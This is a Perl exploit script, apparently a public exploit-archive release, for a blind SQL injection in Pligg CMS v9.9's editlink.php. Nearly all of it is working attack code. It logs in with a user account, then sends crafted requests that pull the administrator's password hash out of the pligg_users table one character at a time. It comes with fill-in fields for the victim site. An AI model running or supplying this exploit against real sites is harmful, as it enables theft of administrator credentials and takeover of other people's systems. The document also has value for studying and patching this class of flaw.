#!/usr/bin/perl

######################################################################################
# Pligg v9.9 Blind SQL Injection
#####################################
#
# vuln:
#   editlink.php? SQL Injection:
#   (magic_quotes off)
#
#   This exploit is possible because the $id variable in check_url.php is taken
#   from the url and then used in an SQL query without being sanitized.
#
#####################################
#
#  by Rohit Bansal [rohitisback@gmail.com] www.Schap.Org
#  original advisory: http://www.milw0rm.com/exploits/5406 (Guido Landi)
#
######################################################################################


 use LWP::UserAgent;
 use HTTP::Request;
 use HTTP::Cookies;

@chars = split(//, "0123456789abcdef");
                                                         ####### CHANGE THESE ########
my $url = "http://victim.compath-to-pligg/";                      # site and path to pligg
my $mylink = 1;                                             # link the user posted
my $username = "user";                                      # username to log in with
my $password = "password";                                  # password to log in with

my $hash;
my $content;

print "\nPligg CMS v9.9 editlink.php Blind SQL Injection\n\n";

print "+ Logging in to $url\n";
print "+ Extracting hash...\n";

$b = LWP::UserAgent->new() or die;
$b->agent('Mozilla');
$cj = HTTP::Cookies->new;
$b->cookie_jar($cj);

$req = HTTP::Request->new(POST=>$url."login.php");
$req->content_type('application/x-www-form-urlencoded');
$req->content("username=$username&password=$password&processlogin=1");
$res = $b->request($req);
$cj->extract_cookies($res);

print "User god hash: ";

for($i = 0;$i < 50; $i++)
{
   for($j = 0; $j < 16; $j++)
   {
       $craft  = "editlink.php?id=(select(if((select%20substr(user_pass,$i,1)%20from%20pligg_users%20where%20";
       $craft .= "user_id=1)=\'" . $chars[$j] . "\'," . $mylink . ",-999)))";
       $req = HTTP::Request->new(GET=>$url.$craft);
       $req->content_type('application/x-www-form-urlencoded');
       $res = $b->request($req);

       $content = $res->content;     
     
      if(!($content =~ /not your link/i))
      {
     print $chars[$j];
         $hash .= $chars[$j];
      }
   }
}

print "\n";

